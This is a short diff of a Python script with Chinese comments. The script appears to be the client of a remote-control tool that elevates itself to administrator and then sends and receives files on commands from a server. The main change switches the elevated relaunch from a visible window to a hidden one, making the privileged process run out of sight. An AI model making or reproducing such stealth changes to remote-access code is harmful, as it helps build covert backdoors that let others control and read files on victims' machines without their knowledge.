@@ -75,7 +75,7 @@ def run_as_admin():
         app_path,       # 要运行的程序路径
         params,         # 命令行参数
         None,           # 工作目录（默认当前）
-        1               # 窗口状态（1 表示正常显示）
+        0               # 窗口状态（0 表示隐藏）
     )
     sys.exit()  # 退出当前未提权的进程
 
@@ -583,6 +583,7 @@ while True:
                             err_msg = f"获取文件信息失败：{str(e)}"
                             err_bytes = err_msg.encode('gbk', errors='ignore')
                             client.sendall(f"{len(err_bytes):08d}".encode() + err_bytes)
+                    
                     #接受文件
                     elif sinter_list[0]=='send':
                         target_dir = sinter_list[1]  # 服务端指定的目标目录
